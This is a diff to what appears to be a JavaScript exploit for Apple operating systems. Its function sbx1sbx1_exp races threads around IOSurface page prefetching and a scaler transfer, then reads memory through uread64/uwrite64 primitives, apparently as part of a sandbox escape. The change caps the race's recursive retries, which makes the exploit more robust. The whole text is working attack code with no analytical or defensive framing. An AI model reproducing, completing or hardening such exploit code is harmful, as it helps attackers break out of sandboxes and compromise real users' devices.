@@ -5933,7 +5933,7 @@
     t.lock = wait_lock;
     return t;
   }
-  function sbx1sbx1_exp(size) {
+  function sbx1sbx1_exp(size, _retries_left = 3) {
     if (size != SBX1SBX1_EXP_SIZE) {
       LOG("[x] Error: EXP mapping length must match hardcoded size, for now.");
       return undefined;
@@ -5983,13 +5983,17 @@
       assert(kr == KERN_SUCCESS);
       let r = 0n;
       pthread_yield_np(pthread_self());
-      if(!cmp8_wait_for_value(threads_ready_counter, 2))
-        return sbx1sbx1_exp(size);
+      if(!cmp8_wait_for_value(threads_ready_counter, 2)) {
+        if (_retries_left <= 0) { LOG("[x] sbx1sbx1_exp retry limit reached (threads_ready)"); return undefined; }
+        return sbx1sbx1_exp(size, _retries_left - 1);
+      }
       uwrite64(threads_ready_counter, 0n);
       ulock_wake(UL_COMPARE_AND_WAIT | ULF_WAKE_ALL, race_thread_lock, 0n);
       IOSurfacePrefetchPages(target_surface);
-      if(!cmp8_wait_for_value(threads_done_counter, 2))
-        return sbx1sbx1_exp(size);
+      if(!cmp8_wait_for_value(threads_done_counter, 2)) {
+        if (_retries_left <= 0) { LOG("[x] sbx1sbx1_exp retry limit reached (threads_done)"); return undefined; }
+        return sbx1sbx1_exp(size, _retries_left - 1);
+      }
       uwrite64(threads_done_counter, 0n);
       kr = scaler_transfer(scaler_connection, source_surface, target_surface);
       r = uread64(read_address);
